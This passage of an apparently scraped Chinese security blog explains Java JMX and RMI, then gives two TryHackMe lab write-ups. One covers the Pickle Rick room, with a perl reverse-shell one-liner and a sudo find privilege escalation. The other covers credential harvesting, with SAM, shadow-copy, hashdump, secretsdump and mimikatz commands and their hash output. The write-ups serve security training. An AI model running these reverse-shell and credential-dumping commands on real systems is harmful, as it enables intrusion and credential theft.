寄存器中存储了下一条需要执行的字节码指令地址。 7、当 calculate 方法执行完成后，对应的栈帧将从虚拟机栈中弹出，方法执行的结果会被压入 main 栈帧中的操作数栈中，而方法返回地址被重置到 main 线程的 PC 寄存器中，以便于后续字节码执行引擎从 PC 寄存器中获取下一条命令的地址。 如果方法没有返回值，JVM 会将一个 null 值压入调用该方法的栈帧的操作数栈中，作为占位符，以便恢复调用方的操作数栈状态。 8、执行引擎中的解释器会从程序计数器中获取下一个字节码指令的地址，也就是元空间中对应的字节码指令，在获取到指令之后，通过解释器解释为对应的机器指令，最终由 CPU 进行执行。 Java 代码首先被编译器转换为字节码，然后在 JVM 上运行。在运行时，JVM 通过解释执行或即时编译（JIT）将字节码转换为机器码。解释执行直接运行字节码，而 JIT 在运行时将热点代码编译优化为机器码以提升性能。 这中间需要运行时数据区来存储字节码数据以及运行时中间数据。 0x03 何为JMX JMX是Java Management Extensions，它是一个Java平台的管理和监控接口。为什么要搞JMX呢？因为在所有的应用程序中，对运行中的程序进行监控都是非常重要的，Java应用程序也不例外。我们肯定希望知道Java应用程序当前的状态，例如，占用了多少内存，分配了多少内存，当前有多少活动线程，有多少休眠线程等等。如何获取这些信息呢？ 为了标准化管理和监控，Java平台使用JMX作为管理和监控的标准接口，任何程序，只要按JMX规范访问这个接口，就可以获取所有管理与监控信息。 实际上，常用的运维监控如Zabbix、Nagios等工具对JVM本身的监控都是通过JMX获取的信息。 因为JMX是一个标准接口，不但可以用于管理JVM，还可以管理应用程序自身。下图是JMX的架构： JMX把所有被管理的资源都称为MBean（Managed Bean），这些MBean全部由MBeanServer管理，如果要访问MBean，可以通过MBeanServer对外提供的访问接口，例如通过RMI或HTTP访问。 注意到使用JMX不需要安装任何额外组件，也不需要第三方库，因为MBeanServer已经内置在JavaSE标准库中了。JavaSE还提供了一个jconsole程序，用于通过RMI连接到MBeanServer，这样就可以管理整个Java进程。 除了JVM会把自身的各种资源以MBean注册到JMX中，我们自己的配置、监控信息也可以作为MBean注册到JMX，这样，管理程序就可以直接控制我们暴露的MBean。因此，应用程序使用JMX，只需要两步： 编写MBean提供管理接口和监控数据； 注册MBean。 在Spring应用程序中，使用JMX只需要一步： 编写MBean提供管理接口和监控数据。 第二步注册的过程由Spring自动完成。 基本概念 JMX 的核心概念包括 MBean（管理bean）、MBeanServer（管理bean服务器）和 JMX Agent（JMX代理）。 MBean 是代表管理资源的对象，它可以是 Java 类或接口。MBean 提供了管理操作的接口，例如获取系统信息、设置参数等。MBeanServer 是管理 bean 的容器，它可以存储和查找管理 bean。JMX Agent 是与本地进程通信的代理，它负责将管理操作转化为本地操作。 MBean（Managed Bean） MBean是JMX的核心概念之一，它是一个资源或服务，可以被管理和监控。MBean实现了javax.management.DynamicMBean接口或者 继承了javax.management.NotificationBroadcasterSupport类。每个MBean都有一个唯一的ObjectName，用于在JMX客户端中标识和访问它。 JMX代理（JMX Agent） JMX代理是一个独立的Java程序，负责加载和管理MBean。JMX代理通常与应用程序部署在一起，以便在应用程序运行时收集和处理MBean的信息。常见的JMX代理有：Java Mission Control、VisualVM等。 JMX客户端（JMX Client） JMX客户端是一个用于访问和管理MBean的工具。它可以与JMX代理通信，获取MBean的信息，以及对MBean进行操作。常见的JMX客户端有：Java Mission Control、VisualVM、jconsole等。 0x04 何为RMI 简介 Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 接口的两种常见实现方式是：最初使用JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现；此外还可以用与CORBA兼容的方法实现。RMI一般指的是编程接口，也有时候同时包括JRMP和API（应用程序编程接口），而RMI-IIOP则一般指RMI接口接管绝大部分的功能，以支持CORBA的实现。 最初的RMI API设计为通用地支持不同形式的接口实现。后来，CORBA增加了传值（pass by value）功能，以实现RMI接口。然而RMI-IIOP和JRMP实现的接口并不完全一致。 更多参考 JAVA RPC：从上手到爱不释手 代理 在客户端为远程对象安装一个代理。代理是位于客户端虚拟机中的一个对象，它对于客户端程序来说，就像是要访问的远程对象一样。客户端调用此代理时，只需进行常规的方法调用。而客户端代理则负责使用网络协议与服务器进行联系。网络模型如下： 存根(stub) 当客户端要调用远程对象的一个方法时，实际上调用的是代理对象上的一个普通方法，我们称此代理对象为存根（stub）。存根位于客户端机器上，而非服务器上。 参数编组 存根会将远程方法所需的参数打包成一组字节，对参数编码的过程就称为参数编组。参数编组的目的是将参数转换成适合在虚拟机之间进行传递的格式，在RMI协议中，对象是使用序列化机制进行编码的。 RMI架构 RMI分为三部分 Registry 类似网关 Server 服务端提供服务 Client 客户端调用 实现RMI所需的API几乎都在： java.rmi：提供客户端需要的类、接口和异常； java.rmi.server：提供服务端需要的类、接口和异常； java.rmi.registry：提供注册表的创建以及查找和命名远程对象的类、接口和异常； 这里给出y4er爷所给出的实例代码： 服务端： package com.test.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMIServer { public static String HOST = \"127.0.0.1\"; public static int PORT = 8989; public static String RMI_PATH = \"/hello\"; public static final String RMI_NAME = \"rmi://\" + HOST + \":\" + PORT + RMI_PATH; public static void main(String[] args) { try { // 注册RMI端口 LocateRegistry.createRegistry(PORT); // 创建一个服务 RMIInterface rmiInterface = new RMIImpl(); // 服务命名绑定 Naming.rebind(RMI_NAME, rmiInterface); System.out.println(\"启动RMI服务在\" + RMI_NAME); } catch (Exception e) { e.printStackTrace(); } } } 上述代码中，在8989端口起了RMI服务，以键值对的形式存储了RMI_PATH和rmiInterface的对应关系，也就是rmi://127.0.0.1:8989/hello对应一个RMIImpl类实例，然后通过Naming.rebind(RMI_NAME, rmiInterface)绑定对应关系。再来看RMIInterface.java package com.test.rmi; import java.rmi.Remote; import java.rmi.RemoteException; public interface RMIInterface extends Remote { String hello() throws RemoteException; } 定义了RMIInterface接口，继承自Remote，然后定义了一个hello()方法作为接口。注意需要抛出RemoteException异常。继续看实现真正功能的类RMIImpl.java package com.test.rmi; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIImpl extends UnicastRemoteObject implements RMIInterface { protected RMIImpl() throws RemoteException { super(); } @Override public String hello() throws RemoteException { System.out.println(\"call hello().\"); return \"this is hello().\"; } } 继承自UnicastRemoteObject类，并且实现之前定义的RMIInterface接口的hello()方法。UnicastRemoteObject类提供了很多支持RMI的方法，具体来说，这些方法可以通过JRMP协议导出一个远程对象的引用，并通过动态代理构建一个可以和远程对象交互的Stub对象。现在就定义好了Server端，来看Client package com.test.rmi; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import static com.test.rmi.RMIServer.RMI_NAME; public class RMIClient { public static void main(String[] args) { try { // 获取服务注册器 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 8989); // 获取所有注册的服务 String[] list = registry.list(); for (String i : list) { System.out.println(\"已经注册的服务：\" + i); } // 寻找RMI_NAME对应的RMI实例 RMIInterface rt = (RMIInterface) Naming.lookup(RMI_NAME); // 调用Server的hello()方法,并拿到返回值. String result = rt.hello(); System.out.println(result); } catch (Exception e) { e.printStackTrace(); } } } 我们可以通过Registry拿到所有已经注册的服务，其中就包括我们注册的hello。然后可以通过Naming.lookup(RMI_NAME)去寻找对应的hello实例，这样就拿到了远程对象，可以直接通过对象来调用hello()方法。 在Java 1.4及 以前的版本中需要手动建立Stub对象，通过运行rmic命令来生成远程对象实现类的Stub对象，但是在Java 1.5之后可以通过动态代理来完成，不再需要这个过程了。运行Server之后再运行Client输出结果 Server 启动RMI服务在rmi://127.0.0.1:8989/hello call hello(). Client 已经注册的服务：hello this is hello(). RMI接口发布和调用流程 1、定义一个远程接口，必须继承Remote接口，其中需要远程调用的方法必须抛出RemoteException异常。 在Java中，只要一个类extends了java.rmi.Remote接口，即可成为存在于服务器端的远程对象，供客户端访问并提供一定的服务。JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”（扩展 java.rmi.Remote 的接口）中指定的这些方法才可被远程调用。 2、创建远程接口的实现类，继承UnicastRemoteObject类实现序列化，必须显式定义无参构造方法。 远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。 3、通过LocateRegistry.createRegistry()创建远程对象注册表Registry的实例，被创建的Registry服务将在指定的端口上侦听到来的请求（默认端口是1099） 4、通过Naming.bind()将远程服务实现类绑定到指定的RMI地址上，执行这个方法后，相当于发布了RMI服务。 5、客户端：通过Naming.lookup()在远程对象注册表Registry中查找指定name的对象，并返回远程对象的引用（一个stub），之后可通过stub调用远程对象的方法。 0x05 参考文章 二哥的Java进阶之路 一文带你彻底了解JMX Java RMI原理及反序列化学习 Java-RMI","tags":["Java基础"],"categories":["Java基础"]},{"title":"THM-Pickle_Rick","path":"/2024/03/10/thm-pickle-rick/","content":"0x01 实验任务 这个以瑞克和莫蒂为主题的挑战要求你利用网络服务器并找到三种成分来帮助瑞克制作魔药，并将自己从泡菜变回人类。 在此任务上部署虚拟机并探索 Web 应用程序：10.10.74.56 0x02 实验开始 nmap扫描 nmap -T4 -sC -sV -p- 10.10.74.56 可以看到开启了两个端口，我们先访问一下web端口 听莫蒂……我需要你的帮助，我又把自己变成了一个泡菜，这次我不能再变回去了! 我需要你*BURRRP*....莫蒂，登录我的电脑，找到最后三种秘密成分来完成我的酸黄瓜反药。唯一的问题是，我不知道密码是什么!救命，莫蒂，救命! 那就是要找到密码了，直接扫一手目录 目录扫描 不过在扫目录的时候，手动看了看web站点，发现源码还有用户名：R1ckRul3s 访问robots.txt得到：Wubbalubbadubdub ——猜测这个是密码，结合上面的用户名，我们访问login.php尝试登录 发现登陆成功，之后探索一番发现只有commands命令页面能访问。其他都无权限（需要真正的Rick权限） 那我们只能在这里搜集一下看有没有信息了，使用ls看到含有两个可以的txt文件 当我们尝试cat读取时，发现命令被禁，那就换其他，这里很幸运，tac读取即可：mr. meeseek hair 很幸运，这个就是第一个原料，接下来读取clue.txt：让我们在文件系统中找其他材料（成分） 这里我查看根目录，发现一个home，认为很可疑，其中含有rick，rick目录下又含有 很幸运，找到了第二个材料，这里读取的时候发现什么结果也没有，我以为又是命令被禁还是啥的，迷茫了半天，结果就在页面源代码处，是一段base64编码，不过需要解码6，7次才ok。如下图所示：rabbit hole 但不知道这里意味着什么，然后就不知道第二个材料咋搞了。。。看了wp发现second ingredients就是一个文件名（只不过中间空格分开了）这里虽然想到过，但没尝试。 直接tac /home/rick/'second ingredients'，得到第二个材料：1 jerry tear 反弹shell 这里看过wp发现都是采取了反弹shell，我们也搞一下： 这里尝试了半天，发现perl命令可以被执行 perl -e 'use Socket;$i=\"10.10.74.56\";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' 拿到之后，大概率就是读取root目录了，但很明显没权限，想到提权，看一下sudo -l 这里我忘了ALL的含义，我估摸着就是很多命令都能用啥的，我直接尝试find的sudo提权了 find提权 sudo find . -exec /bin/sh \\; -quit 输入之后也是成功提权 最后也是成功检索到第三个材料 0x03 总结 这里先根据wp看一下自己做题思路的不足 上图中的 cat 'second ingredients' 之所以加单引号是因为该名称中间存在空格 如果不加引号 则只能识别到second而不是second ingredients 也可以尝试用其他方式处理：second\\ ingredients或者\"second ingredients\" (ALL) NOPASSWD: ALL这代表当前用户可以使用sudo去执行任何命令,而且不需要输入密码 也就是说我上述的提权，就是自作多情（-.-） 关于less命令：less命令 的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览 另外就是做题思路了，大体框架有了初步定型，就是对于某些工具命令的使用犹豫不定。 比如nmap现在还不知道频繁得去使用哪一种，今后再做的时候多注意总结一番。 0x04 参考文章 【THM】Pickle Rick-练习","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Credentials Harvesting(凭据收集)","path":"/2024/03/04/thm-ping-ju-shou-ji/","content":"0x01 简介 欢迎来到凭证收集 该会议室讨论红队成员利用获得的凭证执行横向移动并访问 AD 环境中的资源的基础知识。我们将展示如何获取、重用和模拟用户凭据。 凭据收集包括获取登录信息、帐户名和密码等凭据的技术。它是一种从系统中不同位置（例如明文文件、注册表、内存转储等）提取凭证信息的技术。 作为红队成员，获得合法凭证有以下好处： 它可以提供对系统的访问（横向移动）。 这使得我们的行为更难被发现。 它提供了创建和管理帐户的机会，以帮助实现红队参与的最终目标。 学习目标 了解从本地windows（SAM数据库）提取凭证的方法 了解如何在本地和远程访问 Windows 内存并转储明文密码和身份验证票证。 Windows 凭据管理器简介以及如何提取凭据。 了解提取域控制器凭据的方法 枚举本地管理员密码解决方案 (LAPS) 功能。 介绍导致获取凭据的 AD 攻击。 0x02 凭据收集介绍和实验环境部署 凭证收集是一个术语，是指攻击者尝试获取用于访问目标用户或者目标系统的有效凭据，它是一种检索或者窃取目标机器中已经存储的有效凭据的技术，包括通过网络嗅探攻击来捕捉已传输的有效凭据。 凭据可以以各种不同的形式被我们找到，例如： 帐户详细信息(用户名和密码)。 密码哈希值(包括NTLM哈希等)。 身份验证票据，例如票据授予票据(TGT)、票据授予服务器(TGS)。 任何有助于我们登录目标系统的信息(如私钥等) 一般来说，凭据收集可以分为两种类型：外部凭据收集、内部凭据收集。 外部凭据收集可能涉及网络电子邮件钓鱼等相关技术，主要是诱导用户输入其有效的用户名和密码；而内部凭据收集则需要攻击者使用不同的方法来实现。 我们将重点介绍内部凭据收集技术，假设我们作为攻击者已经获得了针对目标AD域的初始访问权限，与本文实验相关的目标AD域将会把Windows Server 2019机器配置为域控制器，我们可以在对应的Tryhackme实验房间中部署该目标机器(作为DC)。 成功部署好目标机器之后，我们可以选择直接通过浏览器访问该机器或者使用以下凭据在攻击机上通过RDP来访问目标机器： Machine IP: MACHINE_IP(在Tryhackme实验房间页面中部署目标机器，这将随机获得相关的目标IP地址) Username: thm Password: Passw0rd! 目标域：THM或者THM.red 0x03 凭据访问 凭据访问是指攻击者在被入侵的系统中发现有效凭据并且获得对用户凭据的访问权限，这可以帮助攻击者重用有效凭据或者冒充正常AD用户的身份。凭据访问是攻击者进行内网横向移动和访问其他资源(如其他应用程序或系统)的重要前提步骤。对于攻击者而言，尝试获取合法的用户凭据比使用cve来对目标系统进行漏洞利用更加具有可取之处。 关于“凭据访问”的更多信息，请查看MITRE ATT&amp;CK框架的相关部分说明： https://attack.mitre.org/tactics/TA0006/ 用户凭据可能会被不安全地存储在目标系统中的不同位置： Clear-text files：明文文件； Database files：数据库文件； Memory：内存； Password managers：密码管理器； Enterprise Vaults：企业保险库； Active Directory：活动目录； Network Sniffing：网络嗅探。 以明文文件形式存储凭据 攻击者可能会在被入侵的机器上搜索本地或远程文件系统中的凭据，因此而发现的明文文件可能包含用户所创建的敏感信息，包括密码、私钥等。MITRE ATT&amp;CK框架将这种凭据信息定义为不安全凭据：文件中的凭据(T1552.001)。 以下是攻击者可能会感兴趣的几种明文文件类型： 关于命令的历史文件； 配置文件(Web应用程序相关文件、FTP文件…)； 其他与Windows应用程序(网络浏览器、电子邮件客户端等)相关的文件； 备份文件； 共享文件和文件夹； 注册表； 源代码。 以历史命令为例，在目标系统中已经执行过的PowerShell命令会被作为用户配置保存到历史文件中，具体路径如下： C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 对于攻击者而言，检查目标用户正在做什么或者查找与用户相关的敏感信息可能是值得尝试的操作。我们可以尝试寻找我们所感兴趣的信息，例如，下面的命令可用于在目标机器的windows注册表中查找“password”关键字： c:\\Users\\user&gt; reg query HKLM /f password /t REG_SZ /s #OR C:\\Users\\user&gt; reg query HKCU /f password /t REG_SZ /s 以数据库文件形式存储凭据 应用程序通常会使用数据库文件来读取或者写入设置、配置或凭据。在Windows操作系统中，数据库文件通常存储在本地，这些文件是我们检索和查找凭据的绝佳目标。 关于这部分内容，我们可以参考以下博客文件，该文章的内容包含了从目标系统本地的McAfee Endpoint数据库文件中提取凭据的演示示例。 【THM】Breaching Active Directory(入侵活动目录)-红队 使用密码管理器来存储凭据 密码管理器是存储和管理用户用于登录本地机器和Internet网站、服务的密码信息的应用程序，由于它处理的是用户的敏感数据，因此密码管理器中的数据必须被安全地存储，以防止攻击者进行未经授权的访问。 关于密码管理器应用程序的示例如下所示： 内置密码管理器(Windows)； 第三方密码管理器，如KeePass、1Password、LastPass等。 在这些密码管理器应用程序中也可能存在一些错误配置和安全漏洞，这将使得攻击者能够尝试访问密码管理器中所存储的数据。在信息枚举阶段，攻击者可以使用各种工具来获取目标机器上的网络浏览器和桌面应用程序所使用的密码管理器应用程序中已存储的敏感数据。 在本文中，我们将讨论如何访问Windows凭据管理器并尝试提取其中所存储的密码信息。 通过内存转储获取凭据 操作系统内存是Windows操作系统、用户和其他应用程序所相关的敏感信息的丰富来源。计算机数据会在应用程序运行时或执行过程中被加载到内存中，因此，只有对目标系统具有完全控制权限的管理员用户才能手动访问内存。 以下是会被存储在目标系统内存中的敏感数据的例子，包括： 明文形式的凭据； 已经缓存的密码； AD票据。 在本文中，我们将讨论如何访问目标系统的内存并尝试提取明文密码和用于身份验证的票据。 活动目录中的凭据 Active Directory会存储大量与用户、组、计算机等AD对象相关的信息。因此，枚举目标Active Directory环境是红队安全评估的重点之一。虽然活动目录(Active Directory)设计的很安全，但是管理员的一些错误配置可能会使Active Directory容易遭受各种攻击。 以下是一些可能会泄露用户凭据的Active Directory错误配置： 用户描述：管理员可能会在新AD用户的描述中设置了密码，并将密码信息留在用户描述属性中，这就使得该帐户容易被攻击者进行未经授权的访问。 组策略SYSVOL：通过对存在漏洞的SYSVOL进行利用，攻击者可以使用已泄露的加密密钥来访问管理员帐户。(这部分内容将在下文中具体介绍) NTDS：这是一个数据库文件，该文件会包含AD用户的凭据信息，因此它是攻击者的目标之一。 导致AD攻击的其他配置：错误的AD配置会使得相关的AD环境容易受到各种AD攻击，从而造成用户凭据泄露。 通过网络嗅探获取凭据 在获得目标网络的初始访问权限之后，攻击者可以对本地计算机(包括AD环境)进行各种网络攻击，其中针对网络协议的中间人攻击允许攻击者在目标网络环境中创建恶意或欺骗性的资源，以窃取目标网络中的身份验证信息，如NTLM密码哈希值等。 reg query HKLM /f flag /t REG_SZ /s | findstr THM 上述命令成功找到flag所在注册表的位置 枚举目标AD环境，找到victim(受害者)用户在其描述部分所保存的密码值： PS C:\\Users\\thm&gt; Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description #Get-ADUser -Filter {Description -like \"*password*\"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description #Import-Module ActiveDirectory #Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description 0x04 本地Windows凭据 一般情况下，Windows操作系统会提供两种类型的用户帐户：本地和域。本地用户的详细信息会存储在本地Windows文件系统中，而域用户的详细信息则会存储在集中式的Active Directory中。本小节主要讨论本地用户帐户的凭据，并介绍我们应该如何获取这些本地Windows凭据。 键盘记录器 键盘记录器是一种监视和记录计算机键盘输入活动的软件或硬件设备。键盘记录器最初是为合法目的而设计的，例如为软件开发或家长控制提供反馈；然而，它们也可能会被攻击者滥用以窃取数据。作为红队队员，针对繁忙的交互式环境通过键盘记录程序来查找目标用户的凭据是一个不错的选择。如果我们知道一个被入侵的目标机器有一个曾经登录过的用户，我们就可以使用Metasploit框架或者其他工具(充当键盘记录器)来尝试捕获用户的键盘记录，并尝试从这些记录中发现有效凭据。 关于键盘记录器的简单演示，请查看以下博客内容： 【THM】Exploiting Active Directory(利用AD域错误配置)-红队 安全帐户管理器(SAM-Security Account Manager) SAM是Microsoft Windows的一个系统内置数据库，其中包含了当前机器的本地帐户信息，如用户名和密码等，SAM数据库会以加密格式存储这些帐户详细信息，使它们更加难以被检索；此外，在Windows操作系统运行期间，SAM数据库文件不能被任何用户直接读取和访问。 tips：作为攻击者，我们有多种方法和攻击技巧可以转储Windows机器的SAM数据库文件的内容。 在本文我们已经部署的目标机器中，我们可以确认的是：我们无法直接复制或者读取C:\\Windows\\System32\\config\\sam文件。 #在目标机器上，通过使用以下命令可以确认我们无法访问SAM数据库 C:\\Windows\\system32&gt; type c:\\Windows\\System32\\config\\sam type c:\\Windows\\System32\\config\\sam The process cannot access the file because it is being used by another process. C:\\Windows\\System32&gt; copy c:\\Windows\\System32\\config\\sam C:\\Users\\Administrator\\Desktop\\ copy c:\\Windows\\System32\\config\\sam C:\\Users\\Administrator\\Desktop\\ The process cannot access the file because it is being used by another process. 0 file(s) copied. 使用HashDump获取SAM文件 我们可以使用Metasploit Framework内置的hashdump功能来获取SAM数据库文件的内容副本。Metasploit框架会将代码注入到Windows机器的LSASS.exe进程中，从而转储与该进程对应的内存中的哈希值副本。有关hashdump的更多信息，请自行访问MSF发布方rapid7的官方博客。 #我们要在使用MSF针对目标机器获得了meterpreter shell会话之后，才能使用以下命令来执行HashDump。 meterpreter &gt; getuid Server username: THM\\Administrator meterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d::: 通过卷影复制服务获取SAM文件 我们还可以使用Microsoft卷影复制服务来获取SAM文件的内容，这个服务有助于在应用程序对卷进行读写时执行卷备份操作。有关卷影复制服务的更多信息，请自行参考Microsoft的相关文档页面。 具体而言，我们将使用wmic创建一个卷影副本，这需要我们以管理员权限使用命令提示符(CMD)界面来完成，相关步骤如下所示： 以管理员权限运行标准的cmd.exe程序。 执行wmic命令来创建一个关于C: drive的卷影副本。 验证步骤2中所创建的卷影副本是否可用。 从我们在步骤2中所创建的卷影副本中复制出SAM数据库文件。 现在让我们实践一下上面所介绍的内容，以管理员权限运行cmd.exe，然后执行以下wmic命令： #使用WMIC命令来创建一个关于系统C卷的影子副本 C:\\Users\\Administrator&gt; wmic shadowcopy call create Volume='C:\\' Executing (Win32_ShadowCopy)-&gt;create() Method execution successful. Out Parameters: instance of __PARAMETERS { ReturnValue = 0; ShadowID = \"{30821F09-02EF-49E6-A858-2F6CEDBBF11B}\"; }; tips：Windows Management Instrumentation-WMI，wmic含义为WMI(Windows管理工具)命令行，对应的应用程序为wmic.exe。 上述命令成功执行之后，我们就可以使用vssadmin(卷影复制服务管理-Volume Shadow Copy Service administrative)命令行工具来列出并确认我们已经创建了关于系统C:卷的影子副本： #列出可用的卷影副本 C:\\Windows\\system32&gt;vssadmin list shadows vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp. Contents of shadow copy set ID: {2b04f365-d3f6-48c2-a610-00b32854483b} Contained 1 shadow copies at creation time: 3/4/2024 9:25:06 AM Shadow Copy ID: {b5a918e3-32a9-4282-97b3-55ae6aaa143b} Original Volume: (C:)\\\\?\\Volume{19127295-0000-0000-0000-100000000000}\\ Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 Originating Machine: Creds-Harvesting-AD.thm.red Service Machine: Creds-Harvesting-AD.thm.red Provider: 'Microsoft Software Shadow Copy provider 1.0' Type: ClientAccessible Attributes: Persistent, Client-accessible, No auto release, No writers, Differential 上面的输出结果显示我们已经成功地创建了一个关于C:的卷影副本，其路径如下：\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 如前所述，SAM数据库会使用RC4或AES加密算法来进行加密。为了解密SAM数据库文件，我们需要一个解密密钥，该密钥通常会存储在计算机的本地文件系统中： c:\\Windows\\System32\\Config\\system 现在，我们可以将sam(SAM数据库文件)和system(存储了解密密钥的文件)从我们所生成的卷影副本中复制到计算机桌面，具体命令如下所示： C:\\Users\\Administrator&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\Administrator\\Desktop\\sam 1 file(s) copied. C:\\Users\\Administrator&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\Administrator\\Desktop\\system 1 file(s) copied. 得到上述两个文件之后，我们就可以将它们传输到我们的攻击机中(例如使用SCP命令来进行复制)。 通过注册表配置单元获取SAM文件 转储SAM数据库内容的另一种方法是通过Windows Registry Hives(Windows注册表配置单元)。Windows注册表会存储一些供Windows服务使用的SAM数据库内容的副本，而我们可以使用reg.exe来保存Windows注册表的值。如前所述，我们仍然需要基于两个文件来获取并解密SAM数据库文件的内容。 我们需要以管理员权限运行cmd.exe并执行以下命令： #从本地注册表中保存SAM文件和system文件 C:\\Users\\Administrator\\Desktop&gt;reg save HKLM\\sam C:\\users\\Administrator\\Desktop\\sam-reg The operation completed successfully. C:\\Users\\Administrator\\Desktop&gt;reg save HKLM\\system C:\\users\\Administrator\\Desktop\\system-reg The operation completed successfully. 我们可以用Impacket工具包中的一个工具来解密SAM文件：secretsdump.py，Impacket SecretsDump脚本会使用不同的技术从本地和远程系统中提取凭据。 我们先将SAM文件和system文件传输到我们的攻击机中，然后在攻击机上执行以下命令： #在攻击机上执行以下命令 root@hekeats:~# scp THM\\\\thm@10.10.63.254:C:/Users/Administrator/Desktop/sam-reg /tmp/ root@hekeats:~# scp THM\\\\thm@10.10.63.254:C:/Users/Administrator/Desktop/system-reg /tmp/ #Password：Passw0rd! ┌──(root㉿kali)-[/home/hybcx/thm/impacket] └─# python3 examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information. [*] Cleaning up... 在上面的命令中，我们将针对从Windows注册表中所提取的SAM文件和System文件进行凭据提取。-sam命令参数用于指定从Windows机器中所转储的sam文件在攻击机中的路径，-system命令参数则用于指定system文件在攻击机中的路径，此外，我们还需要在上述命令的末尾使用LOCAL命令参数来指定我们要解密的是LOCAL SAM文件，因为该工具也可以用来处理其他类型的解密。 注意：如果我们将上述命令的输出结果与使用Hashdump所获得的NTLM哈希值进行比较，那么我们会注意到它们的结果是不同的。因为SAM文件中的有些帐户是属于Active Directory的，它们的解密密钥并没有存储在我们上面所转储的System文件中；要解密这些AD帐户的凭据信息，我们还需要从Windows中转储SECURITY文件，该文件会包含用于解密Active Directory帐户的密钥。 一旦我们成功获得了目标帐户的NTLM哈希，那么我们就可以尝试使用Hashcat来破解它们，或者可以使用哈希传递(PtH)等技术来模拟这些哈希所对应的用户身份。 补充： 我们还可以通过SAM文件+mimikatz来读取密码，具体命令如下所示： #先在目标机器上导出SAM和System文件 C:\\Windows\\system32&gt; reg save HKLM\\SYSTEM sys.hiv C:\\Windows\\system32&gt; reg save HKLM\\SAM sam.hiv #将上述获得的sys.hiv和sam.hiv文件复制到mimikatz所在文件夹，运行mimikatz，输入lsadump::sam /system:sys.hiv /sam:sam.hiv，即可导出所有用户密码hash 可参考博客：在windows中抓取用户密码 #我们在目标机上以管理员身份运行Mimikatz工具(以管理员身份在目标机上运行cmd，然后再加载Mimikatz即可) C:\\Windows\\system32&gt; C:\\Tools\\Mimikatz\\mimikatz.exe mimikatz# privilege::debug mimikatz# token::elevate mimikatz# lsadump::sam 注意：此处我们所获得的Administrator并不是AD中的SID 500所对应的Administrator帐户，而是DSRM(目录服务还原模式)帐户，此帐户可用于启动DC、登录和尝试恢复AD，Windows网络在将Windows Server升级为DC(域控制器)的过程中会提示我们设置此密码。(相关验证过程请参考返璞归真：NTDS.dit vs SAM) 0x05 LSASS(本地安全认证子系统服务) 什么是LSASS？ 本地安全认证子系统服务(LSASS)是用于处理操作系统安全策略并能在系统上被强制执行的Windows进程，它会验证当前计算机上所登录的用户帐户，并确保该用户所提供的密码、散列和Kerberos票据正确。Windows系统会将凭据存储在LSASS进程中，使用户可以更方便地访问文件共享、SharePoint站点等网络资源，而无需在每次连接时都要求用户输入凭据。 LSASS进程对于红队来说是一个诱人的攻击目标，因为该进程的内存中会存储关于用户帐户的敏感信息。LSASS进程通常可被攻击者用于转储用户凭据，从而进行权限提升、窃取敏感数据或者进行内网横向移动。作为攻击者，如果我们有目标机器的管理员权限，那么我们就可以尝试转储目标机器的LSASS进程的内存，Windows系统会允许我们创建一个转储文件，该文件是给定进程的快照。我们可以通过访问相关的GUI或者使用命令提示符界面(CMD)来完成LSASS进程内存的转储操作，这种攻击在MITRE 